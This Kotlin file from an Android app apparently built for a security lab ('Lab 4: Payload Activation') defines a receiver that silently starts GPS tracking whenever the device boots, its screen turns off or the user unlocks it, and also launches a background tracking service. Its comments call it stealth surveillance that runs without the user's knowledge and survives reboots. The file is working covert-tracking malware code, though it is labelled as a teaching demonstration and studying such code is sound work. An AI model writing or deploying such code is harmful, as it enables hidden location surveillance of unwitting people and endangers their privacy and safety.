package com.example.wildliferescuer.malicious

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import java.util.UUID

/**
 * Auto-Start GPS Tracker on Device Boot
 * 
 * This BroadcastReceiver automatically activates GPS tracking when:
 * - Device boots up (BOOT_COMPLETED)
 * - Device screen turns off (SCREEN_OFF) 
 * - User unlocks device (USER_PRESENT)
 * 
 * Demonstrates Lab 4: Payload Activation concept
 * 
 * CRITICAL PRIVACY VIOLATION:
 * - Starts tracking without user knowledge
 * - Survives device reboots
 * - Continuous surveillance
 */
class GpsAutoStarter : BroadcastReceiver() {
    
    private val TAG = "MALICIOUS_APP"
    
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        
        Log.e(TAG, "╔════════════════════════════════════╗")
        Log.e(TAG, "║  🚨 GPS AUTO-START TRIGGERED 🚨   ║")
        Log.e(TAG, "╚════════════════════════════════════╝")
        Log.e(TAG, "📱 Action: $action")
        
        when (action) {
            Intent.ACTION_BOOT_COMPLETED -> {
                Log.e(TAG, "🔄 Device booted - Starting GPS tracker...")
                startGpsTracking(context, "boot")
            }
            
            Intent.ACTION_SCREEN_OFF -> {
                Log.e(TAG, "🔒 Screen turned off - Activating stealth GPS tracking...")
                startGpsTracking(context, "screen_off")
            }
            
            Intent.ACTION_USER_PRESENT -> {
                Log.e(TAG, "👤 User unlocked device - Resuming GPS tracking...")
                startGpsTracking(context, "unlock")
            }
            
            else -> {
                Log.e(TAG, "❓ Unknown action: $action")
            }
        }
    }
    
    /**
     * Start GPS tracking in background
     */
    private fun startGpsTracking(context: Context, trigger: String) {
        try {
            // Generate device ID
            val deviceId = UUID.randomUUID().toString()
            
            // Create GPS tracker
            val gpsTracker = GpsTracker(context)
            
            // Check permissions
            if (!gpsTracker.hasLocationPermission()) {
                Log.e(TAG, "⚠️ Location permission not granted - GPS tracking unavailable")
                return
            }
            
            // Check if GPS is enabled
            if (!gpsTracker.isGpsEnabled()) {
                Log.e(TAG, "⚠️ GPS is disabled - Cannot track location")
                return
            }
            
            // Start tracking
            Log.e(TAG, "📍 Starting GPS tracking...")
            Log.e(TAG, "   Trigger: $trigger")
            Log.e(TAG, "   Device ID: ${deviceId.take(8)}...")
            
            gpsTracker.startTracking(deviceId, "auto_started_user")
            
            Log.e(TAG, "✅ GPS tracker activated successfully")
            Log.e(TAG, "🗺️  Location tracking in progress...")
            
            // Start foreground service for continuous tracking (optional)
            startGpsService(context, deviceId, trigger)
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start GPS tracker: ${e.message}")
            e.printStackTrace()
        }
    }
    
    /**
     * Start GPS tracking service (optional - for continuous tracking)
     */
    private fun startGpsService(context: Context, deviceId: String, trigger: String) {
        try {
            val serviceIntent = Intent(context, GpsTrackingService::class.java).apply {
                putExtra("deviceId", deviceId)
                putExtra("trigger", trigger)
            }
            
            // Start service
            context.startService(serviceIntent)
            Log.e(TAG, "🚀 GPS tracking service started")
            
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ Could not start GPS service: ${e.message}")
            // Continue anyway - tracking might still work from receiver
        }
    }
}
